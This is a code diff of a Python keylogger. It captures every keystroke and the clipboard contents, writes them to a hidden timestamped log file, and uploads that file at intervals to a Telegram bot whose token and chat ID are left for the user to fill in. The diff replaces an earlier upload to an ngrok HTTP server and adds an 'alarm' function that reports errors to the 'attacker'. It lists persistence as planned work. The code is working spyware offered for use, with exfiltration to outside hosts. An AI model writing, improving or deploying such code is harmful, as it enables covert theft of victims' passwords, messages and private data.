@@ -3,105 +3,132 @@
 # _*_ coding: utf-8 _*_
 
 
-#tested on Linux (Linux kali 6.5.0-kali2-amd64)
+# tested on Linux (Linux kali 6.5.0-kali2-amd64)
 
 # to do:
 # logging keystrokes of virtual keyboard
-
-
-# New:
-# It sends the file to a http server
+# persistence
 
 
 try:
     from os import system,path
     import threading
-    #import socket
     from pynput import keyboard  #type: ignore
-    from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
     from datetime import datetime
-
-    # encryption and encoding
-    #import rsa
-    #from base64 import b64encode
     from time import sleep
+    
+    # clipboard 
+    import gi
+    gi.require_version('Gtk', '3.0')
+    from gi.repository import Gtk,Gdk
+    from pyperclip import paste   # for getting the clipboard data (supports cross platform)
 
-    #supports https
-    from requests import post
-    from requests.exceptions import RequestException
+    # for accessing telegram API
+    import requests
+
 except:
-    #two dependencies pynput and pandas ['-q' for quite mode]
-    system('pip install -q pynput')
-    system('pip install -q pyperclip')
+    pass
 
 
 # <-- Initializing global values -->
 
 # change this
-SERVER_ADDRESS = 'https://bcd4-103-55-96-137.ngrok-free.app/upload'         # replace the Address
-INTERVAL = 5                                                                # set interval according to your requirement
+TOKEN = ''                    # Telegram API Token
+CHAT_ID = ''                  # Telegram Chat ID
+INTERVAL = 60                 # set interval according to your requirement
 
 
 
 # no change required
-duplicate = ['']
 FILENAME = f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log'  # unix oriented [.19062024132058.log]
 
 
+# helper functions
+
+# to notify attacker if any shits happen
+def alarm(msg) -> None :
+    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')
+
+
+
+# (˶˃ ᵕ ˂˶)
 #keystroke record
 class keylogger:
 
     # init
-    def __init__(self):
-        pass
+    def __init__(self) -> None :
+        self.duplicate = ['']
 
 
     # saving the file
-    def savefile(self,data):
+    def savefile(self, data) -> None :
         try:
-            with open(FILENAME,'a+') as fh:
-                #encrypted_data = b64encode(rsa.encrypt(data.encode(), self.publickey))   # encrypting and storing
-                #fh.write(str(encrypted_data))
+            with open(FILENAME, 'a+') as fh:
                 fh.write(str(data))
-        except:
-            pass
+        except Exception as e:
+            alarm(f"Error saving file: {e}")
     
 
-    def Keylogging(self):
-        def on_key_press(key):
+    def Keylogging(self) -> None :
+        def on_key_press(key) -> None :
             try:
-                # to get the clipboard data
-                data = paste()
+                # checks whether duplicate or not
+                def IsDuplicate(data) -> bool :
+                    if data and data != self.duplicate[0]:
+                        self.duplicate[0] = data
+                        return False
+                    return True
+        
+                try:
+                    clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
+                    data = clipboard.wait_for_text()
 
-                if data != duplicate[0]:
-                    self.savefile(f'Clipboard data: {data}\n')
-                    duplicate[0] = data
+                    if data and not IsDuplicate(data):
+                        self.savefile(f'clipboard data: {data}\n')
+                
+                except Exception as ie:
+                    alarm(f"Gtk Error: {ie}")
+                    
+                    # old pyperclip.paste() logic
+                    try:
+                        data = paste()
+                        if data and not IsDuplicate(data):
+                            self.savefile(f'clipboard data {data}\n')
+                    except Exception as pe:
+                        alarm(f"Pyperclip Error: {pe}")
 
-                # logging the keystrokes
+            except Error as e:
+                alarm(f"Error in on_key_press: {e}")
+
+            try:
+                # Keystroke logging
                 self.savefile(f'{str(key)}\n')
+            except Exception as e:
+                alarm(f"Keystroke Logging Error: {e}")
 
-            except:
-                pass
+        try:
+            # Create listener objects
+            with keyboard.Listener(on_press=on_key_press) as listener:
+                listener.join()
+        except Exception as e:
+            alarm(f"Listener Error: {e}")
 
 
-        # Create listener objects
-        with keyboard.Listener(on_press=on_key_press) as listener:
-            listener.join()
-
-
-    # destructor
-    def __del__(self):
+    # destructors
+    def __del__(self) -> None :
         pass
 
 
-# send the file to the http server at regular interval
+
+# upload to Telegram
 class uploader:
     
-    # init
-    def __init__(self):
+    #init
+    def __init__(self) -> None :
         pass
-    
-    def upload_file_periodically(self):
+
+
+    def upload_file_periodically(self) -> None :
         
         sleep(INTERVAL)
         
@@ -109,20 +136,24 @@ class uploader:
             try:
                 if path.exists(FILENAME):
                     with open(FILENAME, 'rb') as fh:
-                        files = {'file': fh}
+                        files = {'document': fh}
+                        resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}',files=files)   # sending the file
 
-                        post(SERVER_ADDRESS, files=files)   # sending the file
+                        if resp.status_code != 200:
+                            alarm(f'Error Code: {resp.status_code}')
 
                 else:
-                    pass  # file not created/found
+                    alarm(f'File not created or found!')  # file not created/found
 
                 sleep(INTERVAL)
 
-            except:
-                pass
-
-    def __del__(self):
+            except Exception as e:
+                alarm(f'Error Occured: {e}')
+    
+    
+    def __del__(self) -> None :
         pass
+
 
 
 
@@ -134,7 +165,7 @@ if __name__=='__main__':
         uploader = uploader()
 
         # <---  implementing threading  ---> 
-       
+        
         # starting the keylogger and daemon = True (to run it in the background)
         keylogger_thread = threading.Thread(target = keylogger.Keylogging,daemon = True)
         keylogger_thread.start() 
@@ -146,7 +177,7 @@ if __name__=='__main__':
 
 
         keylogger_thread.join()
-        uploader_thread.join()   
+        uploader_thread.join()  
     
     except KeyboardInterrupt:
         pass
